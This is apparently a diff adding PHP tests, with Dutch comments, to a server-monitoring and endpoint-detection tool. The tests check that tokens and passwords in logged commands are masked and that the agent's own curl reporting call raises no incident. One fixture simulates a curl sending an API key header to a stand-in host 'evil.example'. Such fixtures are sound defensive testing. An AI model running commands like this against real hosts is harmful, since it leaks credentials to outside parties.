@@ -2233,5 +2233,29 @@ ok($d4 !== '' && !str_contains($d4, 'GEHEIM') && str_contains($d4, 'token=***') 
     'webaanval: tokens en wachtwoorden in adressen weggelakt (nieuw, en bestaande na een update)');
 q('DELETE FROM hosts WHERE id IN (?, ?)', [$hp, $hp + 1]);
 
+// 1.222.2: geheimen in commando's weglakken; de curl van de agent zelf is geen incident
+ok(Inspect::redactCmd('curl -H "X-Agent-Token: GEHEIM1" -H X-Api-Key: GEHEIM2 -u bob:GEHEIM3 --password=GEHEIM4 -H "Authorization: Bearer GEHEIM5" https://x/?token=GEHEIM6')
+    === 'curl -H "X-Agent-Token: ***" -H X-Api-Key: *** -u bob:*** --password=*** -H "Authorization: Bearer ***" https://x/?token=***', 'commando: headers, -u, --password en tokens weggelakt');
+save_setting('ids_enabled', '1');
+q("INSERT INTO hosts (name, address, mode, agent_key_id, edr_on) VALUES ('ci-pve', '10.0.0.97', 'agent', 'abcdef0123456789', 1)");
+$hpv = (int) db()->lastInsertId();
+$hpvx = q('SELECT * FROM hosts WHERE id = ?', [$hpv])->fetch();
+$cur = static fn(string $kid) => ['k' => 'x', 't' => time(), 'pid' => 7001, 'st' => 1, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/curl', 'comm' => 'curl', 'pc' => 'bash',
+    'argv' => ['curl', '-fsS', '-X', 'POST', '-H', "X-Agent-Key: $kid", '--data-binary', '@/var/lib/rzmon/r.json', 'https://rz.example/api.php?action=agent'],
+    'cmd' => "curl -fsS -X POST -H X-Agent-Key: $kid --data-binary @/var/lib/rzmon/r.json https://rz.example/api.php?action=agent"];
+ok(Edr::isAgentCurl($hpvx, $cur('abcdef0123456789')['cmd']) && !Edr::isAgentCurl($hpvx, $cur('ffffffffffffffff')['cmd']), 'agent-curl: alleen met het kenmerk van de eigen sleutel van deze server');
+Edr::process($hpvx, ['ev' => [$cur('abcdef0123456789'), ['k' => 'x', 't' => time(), 'pid' => 7002, 'st' => 1, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/curl', 'comm' => 'curl', 'pc' => 'bash',
+    'argv' => ['curl', '-H', 'X-Api-Key: GEHEIM7', 'https://evil.example/'], 'cmd' => 'curl -H X-Api-Key: GEHEIM7 https://evil.example/']]]);
+$own = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND detail LIKE '%X-Agent-Key%'", [$hpv])->fetchColumn();
+$leak = (int) q("SELECT COUNT(*) FROM edr_events WHERE host_id = ? AND (data LIKE '%GEHEIM7%' OR data LIKE '%abcdef0123456789%')", [$hpv])->fetchColumn()
+    + (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND CONCAT(title, detail) LIKE '%GEHEIM7%'", [$hpv])->fetchColumn();
+ok($own === 0 && $leak === 0, 'endpoint-bewaking: de eigen curl van de agent geeft geen incident, en geheimen worden niet bewaard');
+q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip) VALUES (?, 1, 'edr', 'sigma|x', 'Sigma: Suspicious Curl', 'curl -fsS -H X-Agent-Key: abcdef0123456789 --data-binary @/var/lib/rzmon/r.json', NULL)", [$hpv]);
+$oi = (int) db()->lastInsertId();
+Installer::runSchema();
+$o = q('SELECT status, detail FROM ids_incidents WHERE id = ?', [$oi])->fetch();
+ok($o['status'] === 'done' && !str_contains($o['detail'], 'abcdef0123456789'), 'update: oud incident over de eigen curl afgehandeld en het kenmerk weggelakt');
+q('DELETE FROM hosts WHERE id = ?', [$hpv]);
+
 echo "\n" . ($fails ? "✘ $fails van $n mislukt\n" : "✔ alle $n tests geslaagd\n");
 exit($fails ? 1 : 0);
